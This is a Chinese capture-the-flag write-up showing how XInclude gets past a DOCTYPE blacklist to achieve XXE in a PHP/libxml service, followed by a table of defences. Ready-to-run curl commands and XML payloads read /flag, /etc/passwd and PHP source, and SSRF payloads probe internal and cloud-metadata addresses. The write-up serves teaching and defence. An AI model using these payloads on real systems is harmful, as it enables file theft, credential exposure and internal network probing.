# 29 · XXE - XInclude 绕过 DOCTYPE 黑名单

> 目标: `http://目标地址/`  
> 类型: XXE 变体 (XInclude)  
> 难度: ⭐⭐  
> Flag: `TOGOGO-flag{}`

---

## 0. 一句话姿势

服务端把 `<!DOCTYPE>` 拉黑了，但忘记关 **XInclude**。  
直接用 `<xi:include href="file:///flag" parse="text"/>` 把文件内容**贴**进返回的 XML 里。

---

## 1. 侦察 3 分钟

打开首页 `GET /`，关键信息：

```
POST /     —— 发 XML, 服务端解析并返回合并后的内容
⚠ 安全说明: 为防范 XXE, 服务器禁用了 DOCTYPE 与外部实体加载
Flag 位于 /flag
PHP/7.4.33
```

特点和 Q27/Q28 完全不同：

- **有回显** (响应直接返回解析后的 XML)
- **禁了 DOCTYPE** (经典 `<!ENTITY>` 玩法直接死)
- 只有 1 个接口, 没有 `/dtd-upload`, `/oob` 这些辅助通道

---

## 2. 试错: 经典 XXE 直接 ❌

```bash
curl -s http://目标地址/ \
  -H 'Content-Type: application/xml' \
  --data '<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag">]>
<root>&x;</root>'
```

返回:

```
HTTP/1.1 400 Bad Request
DOCTYPE is not allowed.
```

服务端在 parse 之前用字符串黑名单拦了 `<!DOCTYPE`。  
没有 DOCTYPE 就没法 `<!ENTITY>`, 经典 XXE 这条路堵死了。

---

## 3. 转念: XInclude 不需要 DOCTYPE

XML 标准里有个 W3C 规范叫 **XInclude** (`http://www.w3.org/2001/XInclude`):

- 它是命名空间机制，**不依赖 DTD / DOCTYPE**
- 元素 `<xi:include href="..." parse="text|xml"/>` 会把目标 URL 的内容**就地嵌入**当前 XML
- PHP libxml 默认不会自动处理 XInclude，但只要服务端代码调过一次 `$dom->xinclude()`，整棵树都会被展开

题目正是这种情况：服务端为了实现 "XML Template Merger" 主动调了 `xinclude()`，于是 `xi:include` 变成了一把"绕过 DOCTYPE 黑名单的合法读文件钥匙"。

---

## 4. 手工复刻 (3 行 curl)

把下面这串原样发出去:

```bash
curl -s http://目标地址/ \
  -H 'Content-Type: application/xml' \
  --data '<?xml version="1.0"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///flag"/>
</root>'
```

响应:

```xml
<?xml version="1.0"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  TOGOGO-flag{}
</root>
```

完事。**FLAG = `TOGOGO-flag{}`**

---

## 5. Payload 逐字段解释

```xml
<?xml version="1.0"?>                               ← 标准 XML 声明
<root xmlns:xi="http://www.w3.org/2001/XInclude">   ← ★ 关键: 注册 XInclude 命名空间, 别名 xi
  <xi:include                                       ← XInclude 指令元素
       parse="text"                                 ← 把目标当"纯文本"嵌入(不当 XML 解析, 避免 flag 里有特殊字符出错)
       href="file:///flag"/>                        ← URI: 本地文件 /flag
</root>
```

要点:

1. 整段 **没有 `<!DOCTYPE>`、没有 `<!ENTITY>`** —— 完美绕过黑名单
2. `parse="text"` 比 `parse="xml"` 更稳: 即便目标文件不是合法 XML 也能贴进来
3. `href` 支持的协议看 libxml 编译选项, 常见可用: `file://`, `http://`, `php://filter` (PHP 环境)

---

## 6. 扩展玩法

读 PHP 源码 (防 `<` `>` 被当 XML 解析, 走 base64):

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="php://filter/convert.base64-encode/resource=/var/www/html/index.php"/>
</root>
```

读 `/etc/passwd`:

```xml
<xi:include parse="text" href="file:///etc/passwd"/>
```

SSRF (探内网 / 云元数据):

```xml
<xi:include parse="text" href="http://127.0.0.1:8080/admin"/>
<xi:include parse="text" href="http://169.254.169.254/latest/meta-data/"/>
```

---

## 7. 防御要点

| 措施                    | 说明                                                                                  |
| ----------------------- | ------------------------------------------------------------------------------------- |
| **不要调 `xinclude()`** | PHP libxml 默认不展开 XInclude, 业务代码主动调用才会生效, 能不调就别调                |
| 自定义 entity loader    | `libxml_set_external_entity_loader(fn() => null)` 一刀切, 任何外部资源加载都返回 null |
| `LIBXML_NONET`          | `loadXML($x, LIBXML_NONET)` 禁掉网络协议, 但 `file://` 仍可读, 不够                   |
| 协议白名单              | 解析前先校验 XML 不含 `xi:include` (慎用, 易被命名空间混淆绕过)                       |
| 改 JSON                 | 没 entity / 没 include 概念, 一了百了                                                 |

只防 `<!DOCTYPE>` 是**典型半吊子防御**: 把经典 XXE 堵了, XInclude 却放着, 实战中这种"以为修了"的更危险。
